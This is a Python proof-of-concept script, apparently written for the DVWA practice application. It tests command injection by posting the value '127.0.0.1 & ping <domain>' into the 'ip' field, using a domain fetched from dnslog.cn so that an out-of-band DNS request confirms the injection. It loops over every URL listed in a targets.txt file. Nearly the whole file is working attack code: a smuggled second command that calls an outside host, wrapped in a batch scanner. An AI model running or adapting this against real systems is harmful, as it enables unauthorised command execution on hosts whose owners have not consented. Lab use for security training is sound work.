# -*- coding: utf-8 -*-
"""
@Project  :dvwa-POC
@File     :dvwa-Command-Injection-targets.py
@Date     :2022/5/9 17:13
@Author   :7-R2X

"""
import requests


def get_dnslog_info():
    cookies = {
        'PHPSESSID': '3sk42e7kkmnlekltk2i4ar8ak7',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Referer': 'http://www.dnslog.cn/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        'sec-gpc': '1',
    }

    response = requests.get('http://www.dnslog.cn/getrecords.php',
                            cookies=cookies, headers=headers, verify=False)
    return response.text


def get_dnslog_domain():
    cookies = {
        'PHPSESSID': '3sk42e7kkmnlekltk2i4ar8ak7',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Referer': 'http://www.dnslog.cn/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        'sec-gpc': '1',
    }
    response = requests.get('http://www.dnslog.cn/getdomain.php',
                            cookies=cookies, headers=headers, verify=False)
    return response.text


def check_poc(url):
    cookies = {
        'PHPSESSID': 'cigkmpp2fo5mg1ql8g2h63cut3',
        'security': 'low',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        # Requests sorts cookies= alphabetically
        # 'Cookie': 'PHPSESSID=cigkmpp2fo5mg1ql8g2h63cut3; security=low',
        'DNT': '1',
        'Origin': 'http://192.168.163.131:8080',
        'Referer': 'http://192.168.163.131:8080/vulnerabilities/exec/',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        'sec-gpc': '1',
    }

    domain = get_dnslog_domain()
    print('获取到的dnslog域名为: {}'.format(domain))
    data = {
        'ip': '127.0.0.1 & ping {}'.format(domain),
        'Submit': 'Submit',
    }
    try:
        response = requests.post(
            url=url, cookies=cookies, headers=headers, data=data, verify=False)
        response.encoding = 'gbk'
        if response.status_code == 200 and get_dnslog_info():
            print(get_dnslog_info())
            print('存在命令执行漏洞')
    except Exception as error:
        print(error)


if __name__ == '__main__':
    with open('./targets.txt', 'r') as r:
        for i in r.readlines():
            check_poc(i.replace('\n', ''))
